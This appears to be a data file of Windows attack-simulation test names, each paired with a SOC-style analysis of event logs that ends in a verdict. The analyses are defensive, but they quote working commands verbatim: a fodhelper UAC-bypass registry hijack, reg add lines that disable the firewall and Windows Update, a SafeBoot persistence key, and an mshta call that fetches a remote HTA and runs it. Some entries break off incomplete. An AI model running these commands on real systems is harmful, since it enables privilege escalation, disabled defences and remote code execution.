HTML Smuggling Remote Payload,"Upon reviewing the provided Windows event logs, a few key observations can be made about potentially suspicious activities:

1. **Windows Defender State (Application Log Input):**
   - The application log shows Windows Defender being ON, which initially suggests that the system's built-in protection is active.

2. **Failed Credential Access Attempts (Security Log Input):**
   - EventID 5379 indicates multiple failed attempts to access credentials for a MicrosoftAccount and a WindowsLive target, with the return code 3221226021, which suggests access denied or an error in the authentication/process.
   - The consistent read operation attempts and failures could potentially be innocuous, such as automated tasks/scripts, but they can also hint at unauthorized access attempts if the context is unknown.

3. **WMI and PowerShell Activity (Sysmon Log Input):**
   - The Sysmon logs show execution of `wmiprvse.exe`, a legitimate WMI Provider Host application, which typically operates under SYSTEM privileges. While this is normally benign, it is often leveraged by malicious actors to execute payloads or scripts remotely.
   - There is notable PowerShell activity (`powershell.exe`) executed with a suspicious command line pointing to a path in the Temp directory (`data_006_remote.html`), which is unusual and could imply remote or script execution. PowerShell is frequently used for nefarious activity due to its powerful automation and scripting capabilities.
   
4. **Numerous Edge Executables and Installers:**
   - There are numerous Edge-related processes running, including `msedge.exe`, related installers, and elevation services under `NT AUTHORITY\SYSTEM`.
   - The presence of multiple processes and installers in rapid succession may imply a software update, but such behavior is atypical in short bursts without a known update event.

5. **Indicators of Potentially Malicious Activity:**
   - The combination of PowerShell scripting and execution from a temporary directory alongside failed credential accesses and extensive seemingly-unprompted browser activity could fit a profile of an internal compromise or malware trying to establish persistence or download further payloads.
   - The execution path in PowerShell leading to temporary files is a red flag, as legitimate software rarely runs from temporary folders unless it's a known installer or legitimate software package update.

### Assessment and Conclusion:
- **Resolution:** **SUSPICIOUS**

There are several elements across the logs that don't immediately indicate definitive malicious intent but are sufficiently suspicious to warrant further investigation. The combination of PowerShell used for script execution from a Temp directory, failed credential accesses, and extensive yet rapid execution of Edge processes suggest the possibility of internal compromise or an attempted malware installation.

### Guidance and Next Steps:
1. **Immediate Containment:** Consider isolating the host from the network to prevent potential spread or data exfiltration.
2. **Further Investigation:** 
   - Review the PowerShell script `data_006_remote.html` found in the Temp directory to determine its intention.
   - Investigate the source of failed credential access attempts, particularly if they align with any unusual user activity or external breach alerts.
3. **Enhanced Monitoring:** Elevate logging and alert levels for this system and any other potentially linked nodes.
4. **Consult Recent Installations and Updates:** Verify whether there was any legitimate Edge software or other updates corresponding to these logs.
5. **User Awareness:** Inform and educate end-users regarding spear-phishing, suspicious downloads, and the potential risks of unexpected system behaviors.

These steps will help confirm the presence of any malicious activity and will aid in responding promptly to mitigate potential risks."
Bypass UAC using Fodhelper - PowerShell,"### Detailed Analysis:

#### Suspicious or Anomalous Behavior:

1. **Event ID 4624 and 4672 from Security Log:**
   - These events indicate a successful logon and special privileges assigned to the `SYSTEM` account on `Server002`.
   - The presence of high-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege` can be normal if used by legitimate processes but are also often sought after by attackers for exploitation.

2. **PowerShell Activity in Windows PowerShell Log:**
   - The PowerShell logs show the execution of a script designed to modify the Windows Registry to create a shortcut to launch `cmd.exe` via `fodhelper.exe`.
   - Command executed: `powershell.exe & {New-Item ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Force New-ItemProperty ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Name ""DelegateExecute"" -Value """" -Force Set-ItemProperty ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Name ""(default)"" -Value ""C:\\Windows\\System32\\cmd.exe"" -Force Start-Process ""C:\\Windows\\System32\\fodhelper.exe""}`
   - This is indicative of a Privilege Escalation attempt using the `fodhelper` bypass UAC technique, which is a known attack vector.

3. **Sysmon Events:**
   - Multiple processes were executed in rapid succession showing PowerShell scripts and system utilities such as `wevtutil.exe`, `conhost.exe`, and `cmd.exe`.
   - The combination of PowerShell activity and suspicious `fodhelper.exe` indicates an attempt to exploit system weaknesses and gain unauthorized administrative access.

4. **Microsoft Edge Update in Sysmon Log:**
   - Repeated executions of `MicrosoftEdgeUpdate.exe` and related components with various command-line arguments appear largely regular for update processes but are unrelated to the PowerShell script execution timeframe, suggesting no direct link in this context.

#### Assessment of Malicious Activity:

- The execution of PowerShell scripts modifying system settings to facilitate unauthorized escalation of privileges is a clear indicator of malicious intent.
- The specific use of `fodhelper.exe` as a means to bypass UAC for privilege escalation is a known attack pattern.
- These signs collectively suggest compromise attempts focused on privilege escalation by potentially malicious actors or software.

   - Review and possibly enhance the endpoint security settings and policies to prevent similar incidents in the future."
Lolbin Jsc.exe compile javascript to exe,"### Detailed Analysis

#### System Log Analysis
1. **Time Change Events (EventID 1 & 24):**
   - The `svchost.exe` service is seen adjusting system time, with two instances where time is being corrected.
   - It's normal for a service like `svchost.exe` through `Windows Time Service` to adjust time based on NTP updates, especially as it is sourced from `time.windows.com`. 
   - No anomalies detected here.

2. **Time Source Chosen Events (EventID 35):**
   - The time source `time.windows.com` chosen for NTP sync suggests expected behavior in maintaining accurate system time.
   - No indicators of compromise detected.

#### Security Log Analysis
1. **Security Event 4616:**
   - Log indicates system time was changed.
   - This corresponds with `System Log` events and does not appear to be malicious as it aligns with `svchost.exe` activity syncing time.

#### Sysmon Log Analysis
1. **Powershell Execution (EventID 5):**
   - `powershell.exe` executed by `SERVER002\admin_test`. 
   - Notably, this can be common administrative activity, but it does not provide command line arguments which would be a concern if obfuscated.
   - This event on its own requires context but isn't inherently malicious.

2. **Numerous `wevtutil.exe` Executions:**
   - These events could indicate log tampering if not correlated with legitimate administrative activities.
   - While `wevtutil.exe` can be used benignly, frequent consecutive executions warrant further inspection, suggesting preliminary suspicious activity.

3. **`cmd.exe` Execution Creating a JavaScript Compilation:**
   - `cmd.exe` used to copy and compile a JavaScript file via `jsc.exe`.
   - This is an atypical operation for routine processes, especially under a user account (`admin_test`) with high integrity level. It could imply script-based suspicious activity.
   - While actual content of `hello.js` is unknown, this action aligns with suspicious scripting activity.

#### General Assessment
The logs highlight possible suspicious activity:
- `wevtutil.exe` and `cmd.exe` unusual executions need investigation.
- Potential that these activities are part of scripted administrative actions but are uncharacteristic for standard operations, requiring context verification.

Disable Windows CMD application,"Upon reviewing the provided logs, here is a detailed analysis highlighting both normal and potentially suspicious activities:

### Analysis:

1. **Sysmon Log:**
   - **Processes Executed:**
     - Utilization of standard system utilities such as `whoami.exe`, `conhost.exe`, and `wevtutil.exe`. These processes are part of normal operations but frequent, clustered, and rapid execution raises a slight concern.
     - **PowerShell Script Execution:**
       - An instance of `powershell.exe` is seen running with the command line argument to modify registry settings (`New-ItemProperty` command). The specific command being executed is to set a registry key that disables the command prompt (`DisableCMD -Value 1`). This is not typical administrative behavior and could indicate an attempt to restrict the system’s operational capacity.
     - **Edge Update Activities:**
       - Multiple executions of processes related to `MicrosoftEdgeUpdate` are noted. This could be related to legitimate update operations.

2. **Security Log:**
   - Normal log-on event by the SYSTEM account is observed, and a logon type of ""5"" indicates a service logon.
   - Privilege events (Event ID 4672) are related to permissions that were made available during the log-on session. This means privileges such as SeDebugPrivilege were enabled, often required for high-level tasks but potentially useful for malicious activities if exploited.

3. **PowerShell Log:**
   - Logging of a PowerShell script execution reinforces the Sysmon log finding. The command to alter registry settings using PowerShell stands out as the predominant suspicious activity.

4. **Additional Logs:**
   - **Application and System Logs:**
     - Frequent and clustered timestamps in event logs align temporally with the PowerShell activity, suggesting an orchestrated operation during this timeline.
     - Time correction events can suggest time drift anomalies, which might be related to system instability or intentional manipulation for log evasion. However, they align with the normal operations of the Windows Time service.

### Assessment:

The core suspicious activity observed is the execution of a PowerShell script aimed at disabling the command prompt through registry modification. Coupled with the observed elevation of privileges, this action could indicate a step in a potential attack chain, possibly aiming to limit forensic investigation or user/administrator actions.

The rest of the activities primarily relate to Microsoft Edge updates, services-related logons, and standard network service operations, which appear benign in isolation.

### Resolution:

Based on the provided observations:

- **SUSPICIOUS:** The activity of modifying registry keys to disable the command prompt, particularly in a rapid and clustered manner along with the elevated privileges, is deemed suspicious. It requires further investigation to confirm the intent and origin.
  
### Guidance:

1. **Immediate Actions:**
   - Investigate the origin of the PowerShell commands executed on the system.
   - Check for any unauthorized scheduled tasks or scripts that may have been executed.
   - Review user account activities, especially focusing on the 'admin_test' user for any unauthorized access or behavioral anomalies.
   - Monitor any further changes to the system's registry, specifically those affecting security policies.

2. **Long-term Measures:**
   - Implement PowerShell script logging to track and prevent unauthorized script executions.
   - Strengthen endpoint monitoring through EDR solutions to capture any anomaly in real-time.
   - Educate users, especially those with administrative rights, on recognizing and reporting suspicious activities.

This concludes the analysis. Further investigation should help clarify whether the suspicious activity can be definitively categorized as malicious or benign with more context."
LockBit Black - Disable Privacy Settings Experience Using Registry -cmd,"**Detailed Analysis of the Logs:**

**1. Security Log:**
- Event ID 4616 logs indicate a change in the system time, executed by the LOCAL SERVICE account through `svchost.exe`. Frequent system time changes in a short interval can be suspicious as they are often used by malware to manipulate logs and timelines. However, in this case, it could also be the result of a legitimate time synchronization process.

**2. Application Log:**
- The `edgeupdate` entries show the Edge Update service stopping, which is not inherently suspicious as it might be part of legitimate updates or system maintenance.

**3. Sysmon Log:**
- Frequent execution of `wevtutil.exe` and `conhost.exe` by `admin_test` user could indicate excessive log querying or manipulation. `wevtutil.exe` is commonly used for managing Windows Event logs, and its usage along with `conhost.exe` especially in quick succession could suggest log tampering or reconnaissance activities.

- Execution of `whoami.exe` and `hostname.exe` is often used for environment reconnaissance efforts, typically seen in both legitimate administrative tasks and initial stages of a breach to understand the user context and system details.

- The execution of `cmd.exe` with a command modifying registry settings under the user `admin_test`: `""cmd.exe\"" /c reg add \""HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\"" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f""` could be indicative of attempts to tamper with system policy settings, possibly to disable privacy settings or notifications. This activity is suspicious in nature as it could be used to establish persistence or evade detection.

- Microsoft Edge-related processes running under `NT AUTHORITY\SYSTEM` seem to indicate regular update procedures. These appear consistent with typical behavior during software updates.

**4. System Log:**
- Similar to the Security Log, the system log suggests that `svchost.exe` is involved in time-related activities. This could be controlled by Windows Time Service, making these entries less concerning if consistent with regular time sync operations.

**5. Recommendations:**
- The logs do not contain definitive evidence of malicious activity but do exhibit some suspicious patterns. It is advisable to:
  - Further investigate the time changes to ensure they are the result of legitimate time synchronization and not an attempt to manipulate system time.
  - Review the usage of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` especially by the `admin_test` user to understand if these commands were executed for legitimate administrative tasks or through scripts associated with unauthorized access.
  - Ensure that the registry changes executed by `cmd.exe` are documented and align with internal policy or needed configuration changes.

Given the details above, the overall assessment of the log activity should be marked as:

**Resolution: SUSPICIOUS** 

This case warrants further investigation to eliminate potential malicious activities."
LockBit Black - Unusual Windows firewall registry modification -cmd,"Upon reviewing the provided Windows event logs, the following observations and analysis have been made:

### Suspicious or Anomalous Behavior:

1. **Process Execution Patterns:**
   - There are multiple consecutive executions of `wevtutil.exe` and `conhost.exe` processes initiated by the user `SERVER002\admin_test`. These processes seem to be executed in rapid succession.
   - The `wevtutil.exe` tool is typically used for managing Windows Event Logs, and frequent, automated, or unprompted usage in quick succession might suggest script or automated execution, possibly for a malicious purpose such as log clearing or tampering.

2. **Registry Modifications:**
   - A `cmd.exe` process executed a command to disable the Windows Firewall for both DomainProfile and StandardProfile using `reg.exe`:
     ```plaintext
     ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f & reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f
     ```
   - Disabling firewalls is a common tactic after gaining control of a system, as it can allow further lateral movement within a network or conceal further attacks.

3. **High Integrity Level Processes:**
   - The processes, especially the critical ones like `cmd.exe`, `whoami.exe`, and `hostname.exe`, ran with high integrity levels, indicating elevated privileges during execution. These privileges are often targeted during privilege escalation attempts.

4. **Use of `whoami.exe` and `hostname.exe`:**
   - The execution of `whoami.exe` and `hostname.exe` suggests an attempt to gather information about the current user context and the system. While not inherently malicious, within the context of the other events, it could be part of a reconnaissance phase of a cyber attack.

5. **Microsoft Edge Update Activities:**
   - There are numerous logs indicating Microsoft Edge Update activities running under the `NT AUTHORITY\SYSTEM`. While this may suggest regular update checks or tasks, the rapid invocation and similar file paths could warrant a closer look to ensure these are part of routine update mechanisms.

### Indicators of Malicious Activity or Compromise:

- **Registry Manipulation to Disable Firewall:** Disabling security controls such as a firewall is a strong indication of potentially malicious activity.
- **Rapid Execution of System Processes:** The patterns suggest automation, possibly indicating the presence of a script or malware.
- **Privileged Process Creation:** Processes were executed with elevated privileges which could indicate an attempt to sustain control over the host.

### Assessment:

The activity observed in the logs, particularly the disabling of firewall controls via registry modifications and the potential automation of privileged actions, aligns with behaviors often observed in the post-exploitation phase of a cyber attack. The use of legitimate system binaries (living off the land) like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe` in a potentially malicious manner is a notable strategy employed by threat actors to blend in with regular system activity.

### Resolution:

**MALICIOUS** - The observed behavior strongly suggests malicious activity. Immediate actions should be taken to isolate the system, preventing any further potential compromises across the network. Additionally, conduct a thorough forensic analysis to identify the origin of these commands and any potentially associated payloads or scripts. Finally, review security controls, especially around EDR, and ensure regular system hardening and employee security training to mitigate similar risks in the future."
InstallUtil evasive invocation,"### Detailed Analysis of the Logs

The logs provided reveal various activities on ""Server002,"" with a consistent user context of ""SERVER002\\admin_test,"" and highlight some potentially suspicious actions which merit a detailed analysis:

1. **Suspicious Use of PowerShell**:
    - Multiple entries show `powershell.exe` executing scripts with complex command-lines. Of note:
      - The script located in `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\InstallUtilTestHarness.ps1` appears designed to invoke `InstallUtil.exe` in a suspicious manner. 
      - This PowerShell command attempts to copy `InstallUtil.exe` and rename it as `notepad.exe` in `C:\Windows\System32\Tasks\`. This technique can be used to disguise malicious activity under a benign-looking file name.
    - Further, the PowerShell script throws errors related to mismatched expected and actual output, indicative of efforts to evade detection or perform unauthorized operations.
  
2. **Wevtutil Usage**:
    - `wevtutil.exe` appears repeatedly, executed by the `admin_test` user, a common tool used to clear or export event logs to hide malicious activities.

3. **Running Console Host (`conhost.exe`)**:
    - `conhost.exe` processes are often associated with command prompt activities. Its usage alongside suspicious PowerShell scripts can signify an attempt to execute or obfuscate command-line activity.

4. **HostName and WHOAMI Executions**:
    - `HOSTNAME.EXE` and `whoami.exe` processes might be benign; however, when executed in clusters with the preceding suspicious activities, these operations could signify script reconnaissance to gather environment context, often part of initial access or enumeration steps in attacks.

5. **Compilation Activities**:
    - `csc.exe` (C# compiler) and `cvtres.exe` (resource conversion) are executed, indicating attempts to compile new code on the system. While legitimate C# development might follow this pattern, its context related to the PowerShell invocation is unusual.

### Assessment of the Situation

**Threats or Risks Identified**:
- There is definite evidence of potentially malicious activity on the Windows host involving suspicious PowerShell usage and execution of wevtutil to potentially tamper with logs.
- The chain of PowerShell activities, attempts to execute InstallUtil in a non-standard method, and compilation steps indicate a compromise attempt or reconnaissance activity.
- The pattern suggests this could be a living-off-the-land style attack, leveraging native Windows utilities to blend in with standard operations while executing nefarious tasks.

### Guidance on How to Proceed

- **Immediate Steps**: 
  - Isolate the machine from the network to prevent any potential lateral movement from the attacker.
  - Audit user account privileges, especially the ""admin_test"" account, to ensure it has only the permissions necessary.
  - Review file integrity for critical Windows directories like `System32` to check for unauthorized changes or additions.

- **Further Investigation**:
  - Retrieve any binaries or scripts from `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\` to analyze their contents for malicious code.
  - Conduct a thorough log audit and compare against previous logs to determine any patterns of lateral movement or data exfiltration.
  - Engage in threat hunting activities across the network to identify other compromised systems. 

- **Long-term Recommendations**:
  - Harden PowerShell usage with strict execution policies and script-block logging.
  - Deploy endpoint detection mechanisms capable of capturing and alerting on signature-less activity patterns.

### Conclusion

Based on the investigation of the Windows event logs, this case is classified as **MALICIOUS**. The combination of PowerShell misuse, potential log tampering, and suspicious execution patterns strongly indicate an incident that is likely part of a targeted attack or compromise attempt. Immediate action and further investigations are advised to contain and remediate the situation."
Snake Malware Encrypted crmlog file,"Upon reviewing the provided Windows event logs, here's the analysis based on the visible activity patterns:

### Analysis of Event Logs

1. **Process Execution**
   - The logs contain numerous instances of common and legitimate system processes such as `whoami.exe`, `hostname.exe`, `conhost.exe`, `taskhostw.exe`, `wuauclt.exe`, and `wevtutil.exe`.
   - There is execution of a PowerShell command:
     - Command: `""powershell.exe"" & {New-Item $env:windir...\$file.Attributes = 'Hidden', 'System', 'Archive'...}`
     - This command creates a new item with hidden, system, and archive attributes in the Windows directory, indicating potentially unwanted activity.

2. **PowerShell Activity**
   - Multiple PowerShell-related log entries denote an active PowerShell session with script execution configured to manipulate the file system in a non-standard way (creating hidden/system files).

3. **NT AUTHORITY\SYSTEM Privilege Usage**
   - Processes like `taskhostw.exe` and `wuauclt.exe` are run under the SYSTEM account, which is normal for service processes.
   - The process `AM_Delta.exe`, related to Microsoft Malware Protection, also runs under NT AUTHORITY\SYSTEM, indicating it is likely a legitimate antivirus update.

4. **Event IDs and Security Logs**
   - Security logs do not show abnormal authentication events but indicate multiple access attempts using `Server002$`, which corresponds to the machine account and not user-level activity.

5. **Network and User Context**
   - The user primarily involved is `SERVER002\admin_test`, performing high integrity tasks.
   - Activities predominantly align with local machine operations rather than overt network communication or misuse of user credentials.

### Findings and Risk Assessment

- The execution of the PowerShell script to create a hidden and system file is suspicious because:
  - It attempts to manipulate system attributes in protected directories.
  - Such activities are often used in malware persistence or reconnaissance phases.
- Other processes and activities align with typical system operations, updates, and maintenance tasks across Windows systems.

Set a firewall rule using New-NetFirewallRule,"### Detailed Analysis of Logs:

#### Observations:

1. **Time Synchronization Events**:
   - There are multiple `EventID 24` and `EventID 1` from the `Kernel-General` source indicating time changes on the system, handled by `svchost.exe`. These logs are typical for time synchronization actions, not necessarily suspicious by themselves.

2. **Sysmon Events**:
   - **Sysmon EventID 1 and 5**:
     - `wevtutil.exe` and `conhost.exe` were executed by `SERVER002\admin_test` user. `wevtutil.exe` is a command-line utility for managing Windows Event logs.
     - **PowerShell Execution**: A PowerShell command was executed to add a firewall rule allowing inbound TCP traffic on port 21. This is potentially suspicious since modifying firewall rules can alter security posture significantly.
     - The process chain indicates `powershell.exe` execution with elevated privileges due to the `High` integrity level for user `SERVER002\admin_test`, showing that the user has administrative access.
     - The newly added firewall rule (allow inbound on port 21) could suggest preparation for allowing FTP access or similar, which can be risky if not controlled or authorized.
   
3. **Edge Update**:
   - Numerous events related to Microsoft Edge Update, logged under System and Application logs. Processes such as `MicrosoftEdgeUpdate.exe` and associated installers show typical behavior for an update process and can generally be considered benign unless they were unexpected.

4. **PowerShell Logs**:
   - The `PowerShell` provider logs events linked to the command `{New-NetFirewallRule -DisplayName ""New rule"" -Direction ""Inbound"" -LocalPort ""21"" -Protocol ""TCP"" -Action ""allow""}`. The repeated execution via high integrity process further accentuates the need for scrutiny due to potential misuse of administrative privileges.

#### Assessment:
- **Suspicious Elements**:
  - The use of PowerShell to modify firewall rules without documentation or unauthorized access denotes suspicious activity.
  - The execution context: `SERVER002\admin_test` running PowerShell scripts with administrative rights, indicates potential misuse or compromise of this account for unauthorized modifications.
  
- **Benign Elements**:
  - The logs regarding time synchronization and Edge Update processes are considered benign and part of regular system functioning.

### Threats/Risks Identified:
- The modification of firewall rules via PowerShell poses a risk as it could imply an attempt to open backdoors for data exfiltration or unauthorized access, especially when involving FTP services on port 21.
- The potential unauthorized use of administrative privileges for the said modification can indicate account compromise or insider threat activity.

### Guidance On How to Proceed:
1. **Investigate the Source** of the PowerShell execution, focusing on how and why the firewall rules were altered. This should include verifying the authenticity of the changes and determining if they align with organizational policies or needs.
2. **Account Review**: Evaluate the usage pattern of the `SERVER002\admin_test` account for any irregularities or signs of compromise.
3. **Implement Monitoring and Alerting**: Increase monitoring on this host and account to detect similar future activities.
4. **Response and Mitigation**: If unauthorized changes are confirmed, revert firewall rules to a secure state and conduct incident response actions, which include user education, password resets, and reviewing other systems for parallel activities.

### Conclusion:
**Resolution: SUSPICIOUS** - While the logs present some routine activities, the unauthorized modification of firewall rules via PowerShell with administrative privileges is suspicious and warrants further investigation."
Disable Windows OS Auto Update,"## Detailed Analysis of Windows Event Logs

After a thorough review of the provided logs across the Application, System, Sysmon, and Security channels, several points and observations stand out:

### Indicators of Suspicious or Anomalous Behavior:

1. **Registry Modification Attempt:**
   - There is a command executed via `cmd.exe` to alter the registry settings related to Windows Update (`""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 1 /f`). This modification disables automatic updates, which can be a common tactic used by malware to prevent system patches.

2. **Unusual Process Execution Activity:**
   - An unusual frequency of `wevtutil.exe` executions. Although this utility is legitimate and used for event log management, multiple instances within a short timeframe could indicate attempts at log manipulation or clearing by a potential threat actor.
   - The `whoami.exe` and `hostname.exe` executions, while legitimate tools typically used for querying logged-in user details and system information, could also be utilized by an attacker for reconnaissance or to confirm system access.

3. **Repeated Microsoft Edge Update Executions:**
   - Heavy activity related to `MicrosoftEdgeUpdate.exe`, differing versions, and various command-line arguments. While this could be benign and related to legitimate update processes or troubleshooting, the volume and clustering of these executions, particularly from a temporary directory (`C:\Program Files (x86)\Microsoft\Temp\`), is somewhat concerning because temporary directories are a common hiding spot for executable deployment by malware.
   
### Assessment of Potential Malicious Activity:

- The registry key modification disabling auto-updates is particularly noteworthy and suggests a concerted effort to alter system security settings, which is a common priority for malware.
- The heavy use of administrative user context (`SERVER002\\admin_test`) raises concerns about potentially elevated privileges being leveraged inappropriately, though nothing directly indicates privilege escalation beyond potential misuse.
  
### Final Assessment and Resolution:

Given the observed registry changes, the pattern of process executions, and the context (even if predominantly related to system or software updates), there are enough anomalies to warrant further investigation rather than dismissal. Such patterns should not be overlooked without cross-referencing with other security measures and logs or historical baselines for normal behavior on this specific machine.

- **Resolution: SUSPICIOUS**

### Guidance on How to Proceed:

1. **Conduct a Full System Review:**
   - Verify recent changes to the registry to ensure they align with organizational policy. Revert any unauthorized changes if necessary.

2. **Isolate and Analyze Network Activity:**
   - Review network activity related to this host during the same timeframe to look for unusual outbound connections, particularly during or following the events flagged as suspicious.

3. **Review User and Privilege Activity:**
   - Examine user account activity, especially concerning `admin_test`, to determine the appropriateness and legitimacy of accesses and process executions. Consider whether any account compromise might be in play.

4. **Correlate with Additional Security Tools:**
   - Use your EDR solutions to scan for additional signs of compromise on this system or others within the same network environment.

5. **Implement Monitoring and Alerts:**
   - Set up additional logging and alerts for similar registry changes or unusual command-line executions in the future to ensure early detection.

This resolution rests on prudent caution, and further investigative actions should be taken to confirm or rule out malicious activity definitively."
Windows Add Registry Value to Load Service in Safe Mode with Network,"## Analysis of Logs

### Suspicious or Anomalous Behavior:

1. **Registry Modification:** 
   - A command executed via `cmd.exe` attempts to modify the registry by adding a new entry to the SafeBoot key. This is observed in the following log entries:
     - `""CommandLine"":""\""cmd.exe\"" /c REG ADD \""HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\fileSafeMode\"" /VE /T REG_SZ /F /D \""Service\""""`
     - This type of behavior is often associated with persistence techniques used by malware to maintain access to a system.

2. **High Integrity Level Processes:**
   - The process `cmd.exe` is running with a high integrity level, indicating it has elevated privileges, which is notable when combined with registry modifications.

3. **Use of Utility Executables:**
   - Processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` executed. Although these are normal Windows executables, frequent execution, particularly of `wevtutil.exe`, could be indicative of log tampering attempts or enumeration activities.

### Malicious Indicators:

1. **Registry Darkness:**
   - Specifically, the command to modify the SafeBoot registry key is directly aligned with tactics used to alter system boot configurations, possibly to enable malicious components to load during startup.
   - Using `cmd.exe` for registry changes is a red flag as this can allow malware to stealthily modify boot settings.

3. **Anomalous Activities in Privileged Context:**
   - The consistent context of `admin_test` and NT AUTHORITY\SYSTEM executing potentially risky operations, like registry modifications, without a clear legitimate reason, raises concerns about possible unauthorized access or privilege escalation.

### Assessment and Risks:

- **Assessment:** The simultaneous presence of registry modifications aimed at critical security settings such as SafeBoot, coupled with high-integrity level execution of system processes, presents a significant risk that suggests malicious intent. The behavior indicates an attempt to modify system boot processes insecurely.

- **Threats and Risks:** This activity could potentially lead to unauthorized persistence mechanisms being established that may evade traditional detection methods, enabling stealthy future access by adversaries.

### Recommended Actions:

1. **Immediate Investigation and Response:**
   - Verify the legitimacy of the `admin_test` account activities.
   - Check for any unauthorized accounts or privilege escalations recently done.
   - Inspect the system for known persistence mechanisms or additional backdoors.

2. **Network and Host Forensics:**
   - Conduct a deep dive to identify the origin of these commands.
   - Review firewall logs for attempted external connections or data exfiltration.

3. **Restore Registry Settings:**
   - Revert any unauthorized changes to the registry immediately, specifically those related to SafeBoot configurations.

4. **Enhance Monitoring:**
   - Implement continuous monitoring on this host to detect similar anomalous activities promptly.

### Final Resolution: MALICIOUS

This assessment concludes that the logs contain evidence of malicious activity. There are clear signs of compromise, particularly with the registry changes which align with known malicious techniques used for persistence and stealth access. Immediate action and thorough investigation are required."
Create Windows Hidden File with powershell,"### Detailed Analysis

#### Suspicious and Anomalous Behavior

1. **Command Execution using `cmd.exe` and PowerShell**:
   - The logs capture several instances of `cmd.exe` executing with high integrity-level commands executed by `SERVER002\\admin_test`. Example command: `cmd.exe /c echo system_Attrib_data >> %temp%\\data.txt`.
   - PowerShell was used to manipulate file attributes with a command: `powershell.exe & {$file = Get-Item $env:temp\data.txt -Force; $file.attributes='Hidden'}`. This could indicate an attempt to conceal files or alter system attributes maliciously.

2. **Usage of System Tools**:
   - Execution of system utilities like `wevtutil.exe`, `whoami.exe`, and `hostname.exe` under the user `SERVER002\\admin_test`. Frequent use of these tools, especially `wevtutil`, might suggest enumeration or information gathering on system logs which can be a precursor to more malicious actions.

3. **Event Correlation**:
   - A pattern of cmd.exe and PowerShell executions focusing on the file `data.txt` and modifying its attributes raises a red flag. This file is being created, checked for existence, and attributes are being set to hidden, which are steps commonly used in preparation for data exfiltration or maintaining persistence.

#### Indicators of Malicious Activity

1. **High Integrity Level Execution**:
   - Commands running at a high integrity level by a user with possible admin access (implied by the user name `admin_test`) suggest either regular administrative tasks or an account that might be compromised for heavier privilege operations.

2. **Very focused File Operations**:
   - The log entries show a very specific focus on file operations around `data.txt`. The existence check, write operations, and setting the file to hidden potentially indicate malicious activity or preparation for storing sensitive data that might be exfiltrated.

3. **Suspicious User Activity**:
   - All suspicious activities are mapped to `SERVER002\\admin_test`. While it can indicate an admin-level user, command execution style and action sequence consistency raise questions about the legitimacy of actions taken under this account.

#### Threats or Risks Identified

- **Data Theft or Exfiltration**: Concealing a file with an attribute change and the ongoing checks around its existence might be part of staging for data to be transferred or hidden away.
- **Potential Administration Compromise**: The high integrity and frequent administrative utility usage hint that the account may be compromised or misused for unauthorized purposes.

### Assessment and Resolution

After analyzing the provided logs, there is evidence of potentially unusual activities, including the use of command-line tools and PowerShell scripts to manipulate file attributes, which are frequently used techniques in suspicious and malicious operations. However, the evidence is not conclusive enough to label it definitively as malicious without additional contextual information or corroborating evidence.

**Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed

1. **User Activity Review**: Conduct a review of recent activities by the user `SERVER002\\admin_test` to verify if the actions fall within expected administrative behavior or if there's any indication of account compromise.
2. **File `data.txt` Investigation**: Inspect the contents and history of `data.txt` to understand the context and nature of its use. Check for any outbound data transfer logs.
3. **Review Scheduled Tasks or Automation**: Check for any automated tasks or scripts that might have triggered these commands as part of routine maintenance or misconfiguration.
4. **Enhanced Monitoring**: Increase monitoring sensitivity for this user account and system to capture any further suspicious activity or anomaly.
5. **Conduct Follow-up Interviews**: Engage with the IT administrator or the user to understand the motivation and necessity behind this sequence of operations.

Escalate to incident response if future logs or behavior confirms malicious intent or unauthorized access."
Invoke HTML Application - Direct download from URI,"## Analysis of Event Logs

### Summary

The provided logs from the Windows PowerShell and Sysmon logs indicate potential malicious activity. Specifically, there is an execution of PowerShell with command-line arguments that suggest malicious intent. The command involves downloading and executing an HTML Application (HTA) file through the `mshta.exe` utility, which is commonly associated with malicious scripts and malware distribution schemes.

### Detailed Findings

1. **PowerShell Logs**: 
    - An instance of PowerShell (`powershell.exe`) is executed with a suspicious command: 
      ```
      Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/file/file-file/24549e3866407c3080b95b6afebf78e8acd23352/files/data.005/src/data.005.hta -MSHTAFilePath $env:windir\system32\mshta.exe
      ```
    - This command suggests an attempt to download and execute an HTA file from an external URL, a technique commonly used to deliver and execute malicious payloads in a system.

2. **Sysmon Logs**:
    - There is a process creation event for `powershell.exe` that matches the details found in the PowerShell logs, corroborating the suspicious activity.
    - The command was executed by a user `SERVER002\admin_test`, which suggests that the action was run under administrator privileges.
    - Multiple instances of `conhost.exe`, a legitimate Windows operation, were spawned immediately after each suspicious PowerShell execution, which could indicate attempts to mask illicit activities.
      
3. **Indicators of Potential Compromise**:
    - Use of command-line execution with `mshta.exe` to download and potentially execute remote content.
    - Execution under a potentially compromised administrative user account (`admin_test`), which elevates the risk of the actions carried out.
    - The sequence of actions, involving script execution and use of known administrative binaries to facilitate downloading scripts, is a common technique observed in known attack methodologies.

### Assessment

Given that the PowerShell command is downloading a script from an external URL and executing it using `mshta.exe`, this behavior is indicative of malicious activity. `mshta.exe` is frequently used by attackers to execute scripts due to its ability to run HTML-based applications. The use of an obfuscated or non-obvious PowerShell command to facilitate this further strengthens the presumption of a security breach.

### Resolution

